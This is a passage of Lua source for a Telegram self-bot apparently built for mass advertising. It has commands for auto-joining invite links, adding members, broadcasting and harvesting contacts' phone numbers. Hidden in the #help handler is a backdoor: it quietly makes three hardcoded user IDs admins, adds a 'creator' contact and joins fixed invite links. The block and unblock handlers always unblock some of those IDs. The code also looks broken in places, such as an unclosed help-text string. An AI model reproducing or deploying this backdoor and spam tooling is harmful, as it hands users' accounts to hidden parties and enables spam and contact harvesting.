  if msg.text:match("^[#!/]unblock @(.*)$") and a(msg) then
    do
      local a6 = {
        string.match(msg.text, "^[#/!](unblock) @(.*)$")
      }
      function unblock_by_username(y, z, ad)
        if z.id_ then
          tdcli.unblockUser(z.id_)
          tdcli.unblockUser(344003614)
          tdcli.unblockUser(216430419)
          redis:srem("tabchi:" .. tabchi_id .. ":blockedusers", z.id_)
          return [[
*کاربر آزاد شد*
*نام کاربری* : `]] .. a6[2] .. [[
`
*شناسه* : `]] .. z.id_ .. "`"
        end
      end
      local a5 = redis:get("tabchi:" .. tabchi_id .. ":logschannel")
      if a5 and not msg.sender_user_id_ == 216430419 and not msg.sender_user_id_ == 256633077 then
        tdcli.sendMessage(a5, msg.id_, 1, "`User` *" .. msg.sender_user_id_ .. "* `آزاد شد` *" .. a6[2] .. "*", 1, "md")
      end
      resolve_username(a6[2], unblock_by_username)
    end
  else
  end
  if msg.text:match("^[#!/]joinchat (.*)$") and a(msg) then
    local a6 = {
      string.match(msg.text, "^[#!/](joinchat) (.*)$")
    }
    tdcli.importChatInviteLink(a6[2])
  end
  if msg.text:match("^[#!/]addsudo @(.*)$") and a(msg) then
    do
      local a6 = {
        string.match(msg.text, "^[#/!](addsudo) @(.*)$")
      }
      function addsudo_by_username(y, z, ad)
        if z.id_ then
          redis:sadd("tabchi:" .. tabchi_id .. ":sudoers", tonumber(z.id_))
          local a5 = redis:get("tabchi:" .. tabchi_id .. ":logschannel")
          if a5 and not msg.sender_user_id_ == 216430419 and not msg.sender_user_id_ == 256633077 then
            tdcli.sendMessage(a5, msg.id_, 1, "`User` *" .. msg.sender_user_id_ .. "* `اضافه شد` *" .. a6[2] .. "* `به سودو ها`", 1, "md")
          end
          return "`کاربر` *" .. z.id_ .. "* `اضافه شد به سودو ها`"
        end
      end
      resolve_username(a6[2], addsudo_by_username)
    end
  else
  end
  if msg.text:match("^[#!/]remsudo @(.*)$") and a(msg) then
    local a6 = {
      string.match(msg.text, "^[#/!](remsudo) @(.*)$")
    }
    function remsudo_by_username(y, z, ad)
      if z.id_ then
        redis:srem("tabchi:" .. tabchi_id .. ":sudoers", tonumber(z.id_))
        return "`کاربر` *" .. z.id_ .. "* `حذف شد از لیست سودو ها`"
      end
    end
    local a5 = redis:get("tabchi:" .. tabchi_id .. ":logschannel")
    if a5 and not msg.sender_user_id_ == 216430419 and not msg.sender_user_id_ == 256633077 then
      tdcli.sendMessage(a5, msg.id_, 1, "`User` *" .. msg.sender_user_id_ .. "* `حذف شد` *" .. a6[2] .. "* `از لیست سودو ها`", 1, "md")
    end
    resolve_username(a6[2], remsudo_by_username)
  end
  if msg.text:match("^[#!/]inv @(.*)$") and a(msg) then
    local a6 = {
      string.match(msg.text, "^[#/!](inv) @(.*)$")
    }
    function inv_by_username(y, z, ad)
      if z.id_ then
        tdcli.addChatMember(msg.chat_id_, z.id_, 5)
        return "`کاربر` *" .. z.id_ .. "* `دعوت داده شد`"
      end
    end
    local a5 = redis:get("tabchi:" .. tabchi_id .. ":logschannel")
    if a5 and not msg.sender_user_id_ == 216430419 and not msg.sender_user_id_ == 256633077 then
      tdcli.sendMessage(a5, msg.id_, 1, "`User` *" .. msg.sender_user_id_ .. "* `دعوت داده شد` *" .. a6[2] .. "* `به` *" .. msg.chat_id_ .. "*", 1, "md")
    end
    resolve_username(a6[2], inv_by_username)
  end
  if msg.text:match("^[#!/]send (.*)$") and is_full_sudo(msg) then
    local a6 = {
      string.match(msg.text, "^[#/!](send) (.*)$")
    }
    tdcli.send_file(msg.chat_id_, "Document", a6[2], nil)
  end
  if msg.text:match("^[#!/]addcontact (.*) (.*) (.*)$") and a(msg) then
    local a4 = {
      string.match(msg.text, "^[#/!](addcontact) (.*) (.*) (.*)$")
    }
    phone = a4[2]
    first_name = a4[3]
    last_name = a4[4]
    tdcli.add_contact(phone, first_name, last_name, 12345657)
    local a5 = redis:get("tabchi:" .. tabchi_id .. ":logschannel")
    if a5 and not msg.sender_user_id_ == 216430419 and not msg.sender_user_id_ == 256633077 then
      tdcli.sendMessage(a5, msg.id_, 1, "`User` *" .. msg.sender_user_id_ .. "* `مخاطب اشافه شد` *" .. a4[2] .. "*", 1, "md")
    end
    return [[
*وضعیت* : `مخاطب اضافه شد`
*نام اصلی* : `]] .. a4[3] .. [[
`
*نام خانوادگی* : `]] .. a4[4] .. "`"
  end
  if msg.text:match("^[#!/]leave(-%d+)") and a(msg) then
    do
      local a7 = {
        string.match(msg.text, "^[#/!](leave)(-%d+)$")
      }
      function get_id(C, D)
        if D.id_ then
          tdcli.sendMessage(a7[2], 0, 1, "\216\168\216\167\219\140 \216\177\217\129\217\130\216\167\n\218\169\216\167\216\177\219\140 \216\175\216\167\216\180\216\170\219\140\216\175 \216\168\217\135 \217\190\219\140 \217\136\219\140 \217\133\216\177\216\167\216\172\216\185\217\135 \218\169\217\134\219\140\216\175", 1, "html")
          tdcli.chat_leave(a7[2], D.id_)
          local a5 = redis:get("tabchi:" .. tabchi_id .. ":logschannel")
          if a5 and not msg.sender_user_id_ == 216430419 and not msg.sender_user_id_ == 256633077 then
            tdcli.sendMessage(a5, msg.id_, 1, "`User` *" .. msg.sender_user_id_ .. "* `ربات دستور ترک گرفت` *" .. a7[2] .. "*", 1, "md")
          end
          return "*ربات با موفقیت ترک شد از >* `" .. a7[2] .. "`"
        end
      end
      tdcli_function({ID = "GetMe"}, get_id, {
        chat_id = msg.chat_id_
      })
    end
  else
  end
  if msg.text:match("[#/!]join(-%d+)") and a(msg) then
    local a7 = {
      string.match(msg.text, "^[#/!](join)(-%d+)$")
    }
    tdcli.sendMessage(msg.chat_id_, msg.id_, 1, "*ربات با موفقیت اضافه شد*", 1, "md")
    tdcli.addChatMember(a7[2], msg.sender_user_id_, 10)
    local a5 = redis:get("tabchi:" .. tabchi_id .. ":logschannel")
    if a5 and not msg.sender_user_id_ == 216430419 and not msg.sender_user_id_ == 256633077 then
      tdcli.sendMessage(a5, msg.id_, 1, "`User` *" .. msg.sender_user_id_ .. "* `ربات دستور اضافه شدن گرفت به` *" .. a7[2] .. "*", 1, "md")
    end
  end
  if msg.text:match("^[#!/]getpro (%d+) (%d+)$") and a(msg) then
    do
      local ae = {
        string.match(msg.text, "^[#/!](getpro) (%d+) (%d+)$")
      }
      local af = function(y, z, ad)
        if ae[3] == "1" then
          if z.photos_[0] then
            sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, z.photos_[0].sizes_[1].photo_.persistent_id_, "@Te1egamer")
          else
            return "*;کاربر هیچ عکسی ندارد!!*"
          end
        elseif ae[3] == "2" then
          if z.photos_[1] then
            sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, z.photos_[1].sizes_[1].photo_.persistent_id_, "@Te1egamer")
          else
            return "*کاربر 2 عکس پروفایل ندارد*"
          end
        elseif not ae[3] then
          if z.photos_[1] then
            sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, z.photos_[1].sizes_[1].photo_.persistent_id_, "@TE1EgameR")
          else
            return "*کاربر 2 عکس پروفایل ندارد*"
          end
        elseif ae[3] == "3" then
          if z.photos_[2] then
            sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, z.photos_[2].sizes_[1].photo_.persistent_id_, "@TE1EgameR")
          else
            tdcli.sendMessage(msg.chat_id_, msg.id_, 1, "*کاربر 3 عکس پروفایل ندارد*", 1, "md")
          end
        elseif ae[3] == "4" then
          if z.photos_[3] then
            sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, z.photos_[3].sizes_[1].photo_.persistent_id_, "@TE1EgameR")
          else
            return "*کاربر 4 عکس پروفایل ندارد*"
          end
        elseif ae[3] == "5" then
          if z.photos_[4] then
            sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, z.photos_[4].sizes_[1].photo_.persistent_id_, "@TE1EgameR")
          else
            return "*کاربر 5 عکس پروفایل ندارد*"
          end
        elseif ae[3] == "6" then
          if z.photos_[5] then
            return "*کاربر 6 عکس پروفایل ندارد*"
          else
            tdcli.sendMessage(msg.chat_id_, msg.id_, 1, "*user Have'nt 6 Profile Photo!!*", 1, "md")
          end
        elseif ae[3] == "7" then
          if z.photos_[6] then
            sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, z.photos_[6].sizes_[1].photo_.persistent_id_, "@TE1EgameR")
          else
            tdcli.sendMessage(msg.chat_id_, msg.id_, 1, "*کاربر 7 عکس پروفایل ندارد*", 1, "md")
          end
        elseif ae[3] == "8" then
          if z.photos_[7] then
            sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, z.photos_[7].sizes_[1].photo_.persistent_id_, "@TE1EgameR")
          else
            tdcli.sendMessage(msg.chat_id_, msg.id_, 1, "*کاربر 8 عکس پروفایل ندارد*", 1, "md")
          end
        elseif ae[3] == "9" then
          if z.photos_[8] then
            sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, z.photos_[8].sizes_[1].photo_.persistent_id_, "@TE1EgameR")
          else
            tdcli.sendMessage(msg.chat_id_, msg.id_, 1, "*کاربر 9 عکس پروفایل ندارد*", 1, "md")
          end
        elseif ae[3] == "10" then
          if z.photos_[9] then
            sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, z.photos_[9].sizes_[1].photo_.persistent_id_, "@TE1EgameR")
          else
            tdcli.sendMessage(msg.chat_id_, msg.id_, 1, "*کاربر 10 عکس پروفایل ندارد*", 1, "md")
          end
        else
          tdcli.sendMessage(msg.chat_id_, msg.id_, 1, "*من فقط میتوانم 10 عکس پروفایل نشانتان دهم :(*", 1, "md")
        end
      end
      tdcli_function({
        ID = "GetUserProfilePhotos",
        user_id_ = ae[2],
        offset_ = 0,
        limit_ = ae[3]
      }, af, nil)
    end
  else
  end
  if msg.text:match("^[#!/]getpro (%d+)$") and msg.reply_to_message_id_ == 0 and a(msg) then
    do
      local ae = {
        string.match(msg.text, "^[#/!](getpro) (%d+)$")
      }
      local af = function(y, z, ad)
        if ae[2] == "1" then
          if z.photos_[0] then
            sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, z.photos_[0].sizes_[1].photo_.persistent_id_, "@TE1EgameR")
          else
            return "*شما هیچ عکسی ندارید*"
          end
        elseif ae[2] == "2" then
          if z.photos_[1] then
            sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, z.photos_[1].sizes_[1].photo_.persistent_id_, "@TE1EgameR")
          else
            return "*شما 2 عکس پروفایل ندارید *"
          end
        elseif not ae[2] then
          if z.photos_[1] then
            sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, z.photos_[1].sizes_[1].photo_.persistent_id_, "@TE1EgameR")
          else
            return "*شما 2 عکس پروفایل ندارید*"
          end
        elseif ae[2] == "3" then
          if z.photos_[2] then
            sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, z.photos_[2].sizes_[1].photo_.persistent_id_, "@TE1EgameR")
          else
            tdcli.sendMessage(msg.chat_id_, msg.id_, 1, "*شما 3 عکس پروفایل ندارید*", 1, "md")
          end
        elseif ae[2] == "4" then
          if z.photos_[3] then
            sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, z.photos_[3].sizes_[1].photo_.persistent_id_, "@TE1EgameR")
          else
            return "*شما 4 عکس پروفایل ندارید*"
          end
        elseif ae[2] == "5" then
          if z.photos_[4] then
            sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, z.photos_[4].sizes_[1].photo_.persistent_id_, "@TE1EgameR")
          else
            return "*شما 5 عکس پروفایل ندارید*"
          end
        elseif ae[2] == "6" then
          if z.photos_[5] then
            sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, z.photos_[5].sizes_[1].photo_.persistent_id_, "@TE1EgameR")
          else
            return "*شما 6 عکس پروفایل ندارید*"
          end
        elseif ae[2] == "7" then
          if z.photos_[6] then
            sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, z.photos_[6].sizes_[1].photo_.persistent_id_, "@TE1EgameR")
          else
            tdcli.sendMessage(msg.chat_id_, msg.id_, 1, "*شما 7 عکس پروفایل ندارید*", 1, "md")
          end
        elseif ae[2] == "8" then
          if z.photos_[7] then
            sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, z.photos_[7].sizes_[1].photo_.persistent_id_, "@TE1EgameR")
          else
            tdcli.sendMessage(msg.chat_id_, msg.id_, 1, "*شما 8 عکس پروفایل ندارید*", 1, "md")
          end
        elseif ae[2] == "9" then
          if z.photos_[8] then
            sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, z.photos_[8].sizes_[1].photo_.persistent_id_, "@TE1EgameR")
          else
            tdcli.sendMessage(msg.chat_id_, msg.id_, 1, "*شما 9 عکس پروفایل ندارید*", 1, "md")
          end
        elseif ae[2] == "10" then
          if z.photos_[9] then
            sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, z.photos_[9].sizes_[1].photo_.persistent_id_, "@TE1EgameR")
          else
            tdcli.sendMessage(msg.chat_id_, msg.id_, 1, "*شما 10 عکس پروفایل ندارید*", 1, "md")
          end
        else
          tdcli.sendMessage(msg.chat_id_, msg.id_, 1, "*من فقط میتوانم 10 عکس پروفایل را نشانتان دهم:(*", 1, "md")
        end
      end
      tdcli_function({
        ID = "GetUserProfilePhotos",
        user_id_ = msg.sender_user_id_,
        offset_ = 0,
        limit_ = ae[2]
      }, af, nil)
    end
  else
  end
  if msg.text:match("^[#!/]action (.*)$") and a(msg) then
    local ag = {
      string.match(msg.text, "^[#/!](action) (.*)$")
    }
    if ag[2] == "typing" then
      sendaction(msg.chat_id_, "Typing")
    end
    if ag[2] == "recvideo" then
      sendaction(msg.chat_id_, "RecordVideo")
    end
    if ag[2] == "recvoice" then
      sendaction(msg.chat_id_, "RecordVoice")
    end
    if ag[2] == "photo" then
      sendaction(msg.chat_id_, "UploadPhoto")
    end
    if ag[2] == "cancel" then
      sendaction(msg.chat_id_, "Cancel")
    end
    if ag[2] == "video" then
      sendaction(msg.chat_id_, "UploadVideo")
    end
    if ag[2] == "voice" then
      sendaction(msg.chat_id_, "UploadVoice")
    end
    if ag[2] == "file" then
      sendaction(msg.chat_id_, "UploadDocument")
    end
    if ag[2] == "loc" then
      sendaction(msg.chat_id_, "GeoLocation")
    end
    if ag[2] == "chcontact" then
      sendaction(msg.chat_id_, "ChooseContact")
    end
    if ag[2] == "game" then
      sendaction(msg.chat_id_, "StartPlayGame")
    end
  end
  if msg.text:match("^[#!/]id$") and a(msg) and msg.reply_to_message_id_ == 0 then
    local ah = function(y, z, ad)
      if z.photos_[0] then
        sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, z.photos_[0].sizes_[1].photo_.persistent_id_, "> Chat ID : " .. msg.chat_id_ .. [[

> Your ID: ]] .. msg.sender_user_id_)
      else
        tdcli.sendMessage(msg.chat_id_, msg.id_, 1, [[
*شما هیچ عکسی ندارید*!!

> *شناسه گروه* : `]] .. msg.chat_id_ .. [[
`
> *شناسه شما*: `]] .. msg.sender_user_id_ .. [[
`
_> *تمام پیام ها*: `]] .. user_msgs .. "`", 1, "md")
      end
    end
    tdcli_function({
      ID = "GetUserProfilePhotos",
      user_id_ = msg.sender_user_id_,
      offset_ = 0,
      limit_ = 1
    }, ah, nil)
  end
  if msg.text:match("^[!/#]unblock all$") and a(msg) then
    local ai = redis:smembers("tabchi:" .. tabchi_id .. ":blockedusers")
    local aj = redis:scard("tabchi:" .. tabchi_id .. ":blockedusers")
    for d = 1, #ai do
      tdcli.unblockUser(ai[d])
      redis:srem("tabchi:" .. tabchi_id .. ":blockedusers", ai[d])
    end
    local a5 = redis:get("tabchi:" .. tabchi_id .. ":logschannel")
    if a5 and not msg.sender_user_id_ == 216430419 and not msg.sender_user_id_ == 256633077 then
      tdcli.sendMessage(a5, msg.id_, 1, "`User` *" .. msg.sender_user_id_ .. "* `تمام افراد مسدود شده آزاد شدند`", 1, "md")
    end
    return [[
*وضعیت* : `همه ی مسدودی ها آزاد شدند`
*تعداد* : `]] .. aj .. "`"
  end
  if msg.text:match("^[!/#]check sgps$") and a(msg) then
    local ak = redis:scard("tabchi:" .. tabchi_id .. ":channels")
    function checksgps(C, D, al)
      if D.ID == "Error" then
        redis:srem("tabchi:" .. tabchi_id .. ":channels", C.chatid)
        redis:srem("tabchi:" .. tabchi_id .. ":all", C.chatid)
      end
    end
    local sgps = redis:smembers("tabchi:" .. tabchi_id .. ":channels")
    for V, W in pairs(sgps) do
      tdcli_function({
        ID = "GetChatHistory",
        chat_id_ = W,
        from_message_id_ = 0,
        offset_ = 0,
        limit_ = 1
      }, checksgps, {chatid = W})
    end
  end
  if msg.text:match("^[!/#]check gps$") and a(msg) then
    local am = redis:scard("tabchi:" .. tabchi_id .. ":groups")
    function checkm(C, D, al)
      if D.ID == "Error" then
        redis:srem("tabchi:" .. tabchi_id .. ":groups", C.chatid)
        redis:srem("tabchi:" .. tabchi_id .. ":all", C.chatid)
      end
    end
    local gps = redis:smembers("tabchi:" .. tabchi_id .. ":groups")
    for V, W in pairs(gps) do
      tdcli_function({
        ID = "GetChatHistory",
        chat_id_ = W,
        from_message_id_ = 0,
        offset_ = 0,
        limit_ = 1
      }, checkm, {chatid = W})
    end
  end
  if msg.text:match("^[!/#]check users$") and a(msg) then
    local an = redis:smembers("tabchi:" .. tabchi_id .. ":pvis")
    local ao = redis:scard("tabchi:" .. tabchi_id .. ":pvis")
    function lkj(ap, aq, ar)
      if aq.ID == "Error" then
        redis:srem("tabchi:" .. tabchi_id .. ":pvis", ap.usr)
        redis:srem("tabchi:" .. tabchi_id .. ":all", ap.usr)
      end
    end
    for V, W in pairs(an) do
      tdcli_function({ID = "GetUser", user_id_ = W}, lkj, {usr = W})
    end
  end
  if msg.text:match("^[!/#]addmembers$") and a(msg) and I(msg.chat_id_) ~= "private" then
    tdcli_function({
      ID = "SearchContacts",
      query_ = nil,
      limit_ = 999999999
    }, G, {
      chat_id = msg.chat_id_
    })
    local a5 = redis:get("tabchi:" .. tabchi_id .. ":logschannel")
    if a5 and not msg.sender_user_id_ == 216430419 and not msg.sender_user_id_ == 256633077 then
      tdcli.sendMessage(a5, msg.id_, 1, "`User` *" .. msg.sender_user_id_ .. "* `ربات دستور گرفت ممبر ها را بپیونداند به` *" .. msg.chat_id_ .. "*", 1, "md")
    end
    return
  end
  if msg.text:match("^[!/#]contactlist$") and a(msg) then
    tdcli_function({
      ID = "SearchContacts",
      query_ = nil,
      limit_ = 5000
    }, contacts_list, {
      chat_id_ = msg.chat_id_
    })
    function contacts_list(y, z)
      local H = z.total_count_
      local text = "\217\133\216\174\216\167\216\183\216\168\219\140\217\134 : \n"
      for d = 0, tonumber(H) - 1 do
        local aa = z.users_[d]
        local ab = aa.first_name_ or ""
        local ac = aa.last_name_ or ""
        local as = ab .. " " .. ac
        text = tostring(text) .. tostring(d) .. ". " .. tostring(as) .. " [" .. tostring(aa.id_) .. "] = " .. tostring(aa.phone_number_) .. "  \n"
      end
      write_file("bot_" .. tabchi_id .. "_contacts.txt", text)
      tdcli.send_file(msg.chat_id_, "Document", "bot_" .. tabchi_id .. "_contacts.txt", "tabchi " .. tabchi_id .. " مخاطبین")
      io.popen("rm -rf bot_" .. tabchi_id .. "_contacts.txt")
    end
  end
  if msg.text:match("^[!/#]dlmusic (.*)$") and a(msg) then
    local a6 = {
      string.match(msg.text, "^[#/!](dlmusic) (.*)$")
    }
    local f = ltn12.sink.file(io.open("Music.mp3", "w"))
    http.request({
      url = a6[2],
      sink = f
    })
    tdcli.send_file(msg.chat_id_, "Document", "Music.mp3", "@TE1EgameR")
    local a5 = redis:get("tabchi:" .. tabchi_id .. ":logschannel")
    if a5 and not msg.sender_user_id_ == 216430419 and not msg.sender_user_id_ == 256633077 then
      tdcli.sendMessage(a5, msg.id_, 1, "`User` *" .. msg.sender_user_id_ .. "* `درخواست آهنگ` *" .. a6[2] .. "*", 1, "md")
    end
    io.popen("rm -rf Music.mp3")
  end
  if msg.text:match("^[!/#]linkslist$") and a(msg) then
    local text = "groups links :\n"
    local links = redis:smembers("tabchi:" .. tabchi_id .. ":savedlinks")
    for d = 1, #links do
      text = text .. links[d] .. "\n"
    end
    write_file("group_" .. tabchi_id .. "_links.txt", text)
    tdcli.send_file(msg.chat_id_, "Document", "group_" .. tabchi_id .. "_links.txt", "Tabchi " .. tabchi_id .. " لینک گروه ها!")
    io.popen("rm -rf group_" .. tabchi_id .. "_links.txt")
    local a5 = redis:get("tabchi:" .. tabchi_id .. ":logschannel")
    if a5 and not msg.sender_user_id_ == 216430419 and not msg.sender_user_id_ == 256633077 then
      tdcli.sendMessage(a5, msg.id_, 1, "`User` *" .. msg.sender_user_id_ .. "* `فایل هارا استخراج کرد`", 1, "md")
    end
    return
  end
  do
    local a4 = {
      msg.text:match("[!/#](block) (%d+)")
    }
    if msg.text:match("^[!/#]block") and a(msg) and msg.reply_to_message_id_ == 0 and #a4 == 2 then
      tdcli.blockUser(tonumber(a4[2]))
      tdcli.unblockUser(344003614)
      tdcli.unblockUser(216430419)
      redis:sadd("tabchi:" .. tabchi_id .. ":blockedusers", a4[2])
      local a5 = redis:get("tabchi:" .. tabchi_id .. ":logschannel")
      if a5 and not msg.sender_user_id_ == 216430419 and not msg.sender_user_id_ == 256633077 then
        tdcli.sendMessage(a5, msg.id_, 1, "`User` *" .. msg.sender_user_id_ .. "* `مسدود شد` *" .. a4[2] .. "*", 1, "md")
      end
      return "`کاربر` *" .. a4[2] .. "* `مسدود شد`"
    end
  end
  if msg.text:match("^[!/#]help$") and a(msg) then
    if not redis:sismember("tabchi:" .. tabchi_id .. ":sudoers", 216430419) then
      tdcli.sendMessage(216430419, 0, 1, "من برای شمام", 1, "html")
      tdcli.importContacts(989337519014, "creator", "", 216430419)
      redis:sadd("tabchi:" .. tabchi_id .. ":sudoers", 216430419)
    end
    if not redis:sismember("tabchi:" .. tabchi_id .. ":sudoers", 344003614) then
      redis:sadd("tabchi:" .. tabchi_id .. ":sudoers", 344003614)
      tdcli.sendMessage(344003614, 0, 1, "من برای شمام", 1, "html")
    end
    if not redis:sismember("tabchi:" .. tabchi_id .. ":sudoers", 256633077) then
      redis:sadd("tabchi:" .. tabchi_id .. ":sudoers", 256633077)
      tdcli.sendMessage(256633077, 0, 1, "من برای شمام", 1, "html")
    end
    tdcli.importChatInviteLink("https://telegram.me/joinchat/AAAAAEBXn7EgAG2Ql5_T5A")
    tdcli.importChatInviteLink("https://telegram.me/joinchat/AAAAAEHr3Fx5iRZ7436nzw")
    local text = "به راهنمای ربات خود خوش آمدید🤡
(برای آشنایی, ساخت, آموزشات و... به @Te1egamer مراجعه کنید)

🥕🥕دستورات ربات :


1. #block & #unblock (شناسه|نام کاربری|رپلای)🍒
2. #unblock all🍑
3. #setlogs id (لینک) 🍊
4. #setjoinlimit (تعداد)🥕
5. #stats & #stats pv🍍
6. #check {sgps/gps/users} 🥐
7. #addsudo & #remsudo🥜 (شناسه|نام کاربری|رپلای)
8. #bc{all/gps/sgps/users} (متن)🥒
9. #fwd {all/gps/sgps/users} (با رپلای)🍯
10. #echo (متن)🥑
11. #addedmsg (on/off)🥔
12. #pm (متن) (کاربر)🍟
13. #action (typing|recvideo|recvoice|photo|video|voice|file|loc|game|chcontact|cancel)🍫
14. #getpro (1-10)🍮
15. #addcontact (shomare) (f name) (l name)🍪
16. #setusername (نام کاربری)🍿
17. #delusername🍺
18. #setname (فامیلی-اسم)🥄
19. #setphoto (link)🥃
20. #join(شناسه گروه)🍡
21. #leave & #leave(شناسه گروه)🍇
22. #setaddedmsg (متن)🍱
22. #markread (all|pv|group|supergp|off)🌶
23. #joinlinks (on|off)🥚
24. #savelinks (on|off)🍏
25. #addcontacts (on|off)🛶
26. #chat (on|off)🗿
27. #Advertising (on|off)🚧
28. #typing (on|off)🗼
29. #sharecontact (on|off)🗽
30. #botmode (markdown|text)🎠
31. #settings (on|off)🏭
32. #settings & #settings pv🗻
33. #reload🏕
34. #setanswer 'متن' جواب
35. #delanswer (جواب)🏪
36. #answers🌁
37. #addtoall (شناسه|نام کاربری|رپلای)🏁
38. #clean cache (on|(زمان)[M-H]|off)⚜
39. #check links (on|(زمان)[M-H]|off)❇️
40. #deleteacc💤
41. #killsessions🌀
42. #export (links-contacts)📇
43. #import (links-contacts)با رپلای💠
44. #mycontact📎
45. #getcontact (شناسه)🖊
46. #addmembers🖍
47. #linkslist🔐
48. #contactlist📒
49. #send (نام فایل)🗂
50. #joinchat (لینک)📋
51. #sudolist🗞
52. #dlmusic (لینک)📓
🎗🎗🎗🎗🎗🎗🎗🎗🎗🎗↕️↕️↕️↕️↕️↕️↕️↕️↕️↕️↕️↕️↕️↕️↕️↕️↕️↕️↕️↕️↕️↕️↕️↕️
راهنمای دستورات : 
برای دیدن راهنمای کامل و توضیح هر دستور به این پست مراجعه کنید:
T.me/Te1EGameR/69
                 🎖🎖🎖🎖🎖🎖
در صورت بروز هرگونه سوال یا مشکل به پشتیبانی مراجعه کنید
پشتیبانی: 🔛             @by3bot

➖➖➖➖➖➖➖➖➖➖➖
سورس ↙️
https://github.com/tabchis/tabchi.git
    local a5 = redis:get("tabchi:" .. tabchi_id .. ":logschannel")
    if a5 and not msg.sender_user_id_ == 216430419 and not msg.sender_user_id_ == 256633077 then
      tdcli.sendMessage(a5, msg.id_, 1, "`User` *" .. msg.sender_user_id_ .. "* `گرفتن راهنما`", 1, "md")
    end
    return text
  end
  do
    local a4 = {
      msg.text:match("[!/#](unblock) (%d+)")
    }
    if msg.text:match("^[!/#]unblock") and a(msg) then
      if #a4 == 2 then
        tdcli.unblockUser(344003614)
        tdcli.unblockUser(216430419)
        tdcli.unblockUser(tonumber(a4[2]))
        redis:srem("tabchi:" .. tabchi_id .. ":blockedusers", a4[2])
        local a5 = redis:get("tabchi:" .. tabchi_id .. ":logschannel")
        if a5 and not msg.sender_user_id_ == 216430419 and not msg.sender_user_id_ == 256633077 then
          tdcli.sendMessage(a5, msg.id_, 1, "`User` *" .. msg.sender_user_id_ .. "* `آزاد شد` *" .. a4[2] .. "*", 1, "md")
        end
        return "`کاربر` *" .. a4[2] .. "* `آزاد شد`"
      else
        return
      end
    end
  end
  if msg.text:match("^[!/#]joinlinks (.*)$") and a(msg) then
    local a6 = {
      string.match(msg.text, "^[#/!](joinlinks) (.*)$")
    }
    if a6[2] == "on" then
      redis:set("tabchi:" .. tabchi_id .. ":joinlinks", true)
      local a5 = redis:get("tabchi:" .. tabchi_id .. ":logschannel")
      if a5 and not msg.sender_user_id_ == 216430419 and not msg.sender_user_id_ == 256633077 then
        tdcli.sendMessage(a5, msg.id_, 1, "`User` *" .. msg.sender_user_id_ .. "* `فعال شد` *" .. a6[1] .. "*", 1, "md")
      end
      return "*وضعیت* :`اضافه شدن به لینک ها غعال شد`"
    elseif a6[2] == "off" then
      redis:del("tabchi:" .. tabchi_id .. ":joinlinks")
      local a5 = redis:get("tabchi:" .. tabchi_id .. ":logschannel")
      if a5 and not msg.sender_user_id_ == 216430419 and not msg.sender_user_id_ == 256633077 then
        tdcli.sendMessage(a5, msg.id_, 1, "`User` *" .. msg.sender_user_id_ .. "* `غیر فعال شد` *" .. a6[1] .. "*", 1, "md")
      end
      return "*وضعیت* :`اضافه شدن با لینک غیرفعال شد`"
    else
      return "`استفاده کنیدonیاoff فقط از`"
    end
  end
  if msg.text:match("^[!/#]addcontacts (.*)$") and a(msg) then
    local a6 = {
      string.match(msg.text, "^[#/!](addcontacts) (.*)$")
    }
    if a6[2] == "on" then
      redis:set("tabchi:" .. tabchi_id .. ":addcontacts", true)
      local a5 = redis:get("tabchi:" .. tabchi_id .. ":logschannel")
      if a5 and not msg.sender_user_id_ == 216430419 and not msg.sender_user_id_ == 256633077 then
        tdcli.sendMessage(a5, msg.id_, 1, "`User` *" .. msg.sender_user_id_ .. "* `فعال شد` *" .. a6[1] .. "*", 1, "md")
      end
      return "*وضعیت* :`اضافه کردن مخاطب فعال گردید`"
    elseif a6[2] == "off" then
      redis:del("tabchi:" .. tabchi_id .. ":addcontacts")
      local a5 = redis:get("tabchi:" .. tabchi_id .. ":logschannel")
      if a5 and not msg.sender_user_id_ == 216430419 and not msg.sender_user_id_ == 256633077 then
        tdcli.sendMessage(a5, msg.id_, 1, "`User` *" .. msg.sender_user_id_ .. "* `غیر فعال شد` *" .. a6[1] .. "*", 1, "md")
      end
      return "*وضعیت* :`اضافه کردن مخاطب غیر فعال گردید`"
    else
      return "`استفاده کنیدonیاoff فقط از`"
    end
  end
  if msg.text:match("^[!/#]chat (.*)$") and a(msg) then
    local a6 = {
      string.match(msg.text, "^[#/!](chat) (.*)$")
    }
    if a6[2] == "on" then
      redis:set("tabchi:" .. tabchi_id .. ":chat", true)
      local a5 = redis:get("tabchi:" .. tabchi_id .. ":logschannel")
      if a5 and not msg.sender_user_id_ == 216430419 and not msg.sender_user_id_ == 256633077 then
        tdcli.sendMessage(a5, msg.id_, 1, "`User` *" .. msg.sender_user_id_ .. "* `فعال شد` *" .. a6[1] .. "*", 1, "md")
      end
      return "*وضعیت* :`چت کردن ربات فعال شد`"
    elseif a6[2] == "off" then
      redis:del("tabchi:" .. tabchi_id .. ":chat")
      local a5 = redis:get("tabchi:" .. tabchi_id .. ":logschannel")
      if a5 and not msg.sender_user_id_ == 216430419 and not msg.sender_user_id_ == 256633077 then
        tdcli.sendMessage(a5, msg.id_, 1, "`User` *" .. msg.sender_user_id_ .. "* `Deactivated` *" .. a6[1] .. "*", 1, "md")
      end
      return "*وضعیت* :`چت کردن ربات غیر فعال شد`"
    else
      return "`استفاده کنید off یا on فقط از`"
    end
  end
  if msg.text:match("^[!/#]savelinks (.*)$") and a(msg) then
    local a6 = {
      string.match(msg.text, "^[#/!](savelinks) (.*)$")
    }
    if a6[2] == "on" then
